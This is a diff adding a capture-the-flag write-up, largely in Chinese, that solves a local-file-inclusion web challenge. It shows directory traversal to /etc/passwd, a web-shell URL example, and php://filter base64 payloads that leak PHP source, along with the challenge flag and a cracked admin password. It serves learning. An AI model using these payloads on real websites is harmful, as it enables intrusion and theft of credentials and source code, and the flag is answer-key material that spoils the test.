@@ -1,0 +1,130 @@
+2017/8/21 Gamepire from NCU ADL lab
+
+LFI exploit on https://hackme.inndy.tw/lfi/?page=pages/index
+
+What the hxll is LFI(Local File inclusion)?
+
+	基本上是因為php裡的一個function -> include()的不當使用造成的
+	include()可以讓使用者直接從url執行or取得一些邪惡的東東
+	參考以下程式碼：
+	$file = $_GET['file'];
+	include('directory/' . $file);
+
+	attacker就可以利用此漏洞
+	1.先上傳一個php_shell.php(if available)
+	然後->http://victim.com/?file=../../uploads/php_shell.php?cmd=[commend]
+	2.執行 Directory Traversal attack 
+	ex. http://victim.com/?file=../../../../etc/passwd
+	這裡就花俏了，可以gain access to credentials, logs, source code and other 
+	sensitive information that may help advance an attack
+
+
+Lets find LFI~~(以本題為例)
+
+	基本上若打上http://victim.com/index.php?file=/etc/passwd
+	有反應的話(噴root:x:0:0:root:/root:/bin/bash等等)那就嘿嘿～
+	所以....
+	https://hackme.inndy.tw/lfi/?page=pages/index.php?file=../../etc/passwd
+	嗯，噴了root:x:0:0:root:/root:/bin/bash
+
+	OK接下來由於此題無法上傳檔案，那就只好用第二種方法了
+
+php://filter   ..what?
+
+	filter 是一個php5.0之後內建的function用來過濾和驗證字串，有幾種filter：
+	string filter, conversion filter, cimporession filter, encription filter
+
+	ex:
+	$fp = fopen('php://output', 'w');
+	stream_filter_append($fp, 'convert.base64-encode');
+	fwrite($fp, "This is a test.\n");
+	fclose($fp);
+	/* Outputs:  VGhpcyBpcyBhIHRlc3QuCg==  */
+
+	這裏看到我們可以利用stream_filter_append加上convert.base64-encode
+	來將字串(resource)做base64 encode
+	那在url上我們可以這樣打php://filter/convert.base64-encode/resource=target.php
+	來將target.php做base64 encode 
+
+OK好戲上場！
+
+	結合LFI以及php://filter
+	我們可以這樣做：
+	https://hackme.inndy.tw/lfi/?page=pages/index.php?page=php:
+	//filter/convert.base64-encode/resource=whatever.php
+
+	那我們從網頁檢查器可以看到總共有
+	pages/index, pages/intro, pages/login, and pages/flag(hidden)
+	那當然直接去看pages/flag沒有用，要看就要看他的source code :)
+	所以..
+	https://hackme.inndy.tw/lfi/?page=pages/index.php?page=php:
+	//filter/convert.base64-encode/resource=pages/flag
+
+	就會噴出：
+	Q2FuIHlvdSByZWFkIHRoZSBmbGFnPD9waHAgcmVxdWlyZSgnY29uZmlnLnBocCcpOyA/Pj8K
+
+	那再做個base64 decode 就能得到：
+	Can you read the flag<?php require('config.php'); ?>?
+
+	所以..
+	https://hackme.inndy.tw/lfi/?page=pages/index.php?page=php:
+	//filter/convert.base64-encode/resource=pages/config
+
+	就會噴出：
+	PD9waHAKCiRmbGFnID0gIkZMQUd7WW9vb29vb19MRklfZzAwZF8yY1h4c1hTWVA5RVZMcklvfSI7Cg==
+
+	decode: <?php
+
+	$flag = "FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}";
+
+	Done!
+
+	假如你沒看到pages/flag，而且你又想進入admin...那就：
+	https://hackme.inndy.tw/lfi/?page=pages/index.php?page=php:
+	//filter/convert.base64-encode/resource=pages/login
+
+	解碼後得到login page的source code
+	<?php
+	require('config.php');
+	if($_POST['user'] === 'admin' && md5($_POST['pass']) === 'bed128365216c019988915ed3add75fb') {
+	    echo $flag;
+	} else {
+	?>
+	<form action="?page=pages/login" method="post" role="form">
+		<div class="form-group">
+			<label for="user-i">User</label>
+			<input type="text" class="form-control" id="user-i" placeholder="Username" name="user">
+		</div>
+		<div class="form-group">
+			<label for="pass-i">Password</label>
+			<input type="password" class="form-control" id="pass-i" placeholder="Password" name="pass">
+		</div>
+		<button type="submit" class="btn btn-primary">Login</button>
+	</form>
+	<?php } ?>
+
+	在對 bed128365216c019988915ed3add75fb 做md5解碼
+	得到 passw0rd
+	就能進入admin嚕嚕嚕～～
+	裡面有flag :)
+
+	Done again!
+
+心得：
+
+	靠著google提示：LFI php://filter
+	學到了很多東西，包括LFI特徵，php filter使用等等
+	其實已經做到
+	https://hackme.inndy.tw/lfi/?page=pages/index.php?page=php:
+	//filter/convert.base64-encode/resource=flag
+	的地步了，但是還是一直error，最後偷找了一下解答，發現是pages/flag，不是flag
+	當下雖然覺得超幹，但其實心裡還是滿開心的(至少對了9成XDD)
+	不過這顯示了我對web還不是很敏感，對php filter不夠熟(應該是整個php...)
+	而且也不夠細心(都<a href="?page=pages/intro">Introduction</a>給你了=.=)
+	希望下次能更靈性一點，然後記住這次學到的東西:)
+
+
+
+
+
+
